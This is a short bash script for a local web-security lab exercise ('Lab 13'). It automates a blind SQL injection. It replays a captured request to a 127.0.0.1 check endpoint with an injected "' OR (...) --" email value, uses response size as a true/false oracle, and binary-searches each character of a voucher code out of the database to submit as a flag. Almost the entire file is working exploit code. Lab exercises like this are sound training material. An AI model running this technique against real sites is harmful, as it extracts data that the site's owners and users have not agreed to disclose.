#!/usr/bin/env bash
# Lab 13 — binary-search each character through a one-bit oracle.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9130}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab13

"$H5I" browser open "$URL/api/check?email=ada@example.test" \
    --session "$SESSION" --new --capture >/dev/null

# ask CONDITION -> "true" | "false"
ask() {
    "$H5I" websec replay req_0 --session "$SESSION" --reset-budget \
        --set "query.email=zz' OR ($1) -- " |
        python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["bytes"])'
}
TRUE_BYTES="$(ask "1=1")"

OUT=""
for i in $(seq 1 64); do
    LO=32; HI=126
    [ "$(ask "(SELECT length(code) FROM vouchers) < $i")" = "$TRUE_BYTES" ] && break
    while [ "$LO" -lt "$HI" ]; do
        MID=$(((LO + HI) / 2))
        if [ "$(ask "(SELECT unicode(substr(code,$i,1)) FROM vouchers) > $MID")" = "$TRUE_BYTES" ]; then
            LO=$((MID + 1))
        else
            HI=$MID
        fi
    done
    OUT="$OUT$(printf "\\$(printf '%03o' "$LO")")"
done
printf '%s\n' "$OUT" | flag
